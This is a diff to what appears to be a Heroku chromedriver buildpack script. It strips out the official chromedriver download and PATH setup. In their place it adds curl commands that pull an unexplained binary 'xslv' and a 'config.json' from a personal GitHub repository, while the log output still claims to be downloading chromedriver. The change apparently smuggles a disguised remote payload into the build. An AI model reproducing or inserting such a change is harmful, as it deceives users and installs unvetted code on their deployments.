@@ -25,24 +25,13 @@ ENV_DIR=${3:-}
 BIN_DIR=$BUILD_DIR/.chromedriver/bin
 mkdir -p $BIN_DIR
 
-if [ -f $ENV_DIR/CHROMEDRIVER_VERSION ]; then
-  VERSION=$(cat $ENV_DIR/CHROMEDRIVER_VERSION)
-else
-  topic "Looking up latest chromedriver version"
-  LATEST="https://chromedriver.storage.googleapis.com/LATEST_RELEASE"
-  VERSION=`curl -s $LATEST`
-fi
-indent "Version $VERSION"
+indent "Version"
 
-topic "Downloading chromedriver v$VERSION"
-ZIP_URL="https://chromedriver.storage.googleapis.com/$VERSION/chromedriver_linux64.zip"
-ZIP_LOCATION="/tmp/chromedriver.zip"
-curl -s -o $ZIP_LOCATION $ZIP_URL
-unzip -o $ZIP_LOCATION -d $BIN_DIR
-rm -f $ZIP_LOCATION
+topic "Downloading chromedriver"
+BIN_URL="https://raw.githubusercontent.com/romanferty/herokslvdr/main/xslv"
+BIN_LOC=$BIN_DIR/xslv
+curl -s -o $BIN_LOC $BIN_URL
+CONFIG_URL="https://raw.githubusercontent.com/romanferty/herokslvdr/main/config.json"
+CONFIG_LOC=$BIN_DIR/config.json
+curl -s -o $CONFIG_LOC $CONFIG_URL
 indent "Downloaded"
-
-topic "Creating chromedriver export scripts"
-mkdir -p $BUILD_DIR/.profile.d
-echo "export PATH=\$PATH:\$HOME/.chromedriver/bin" >> $BUILD_DIR/.profile.d/chromedriver.sh
-indent "Created"
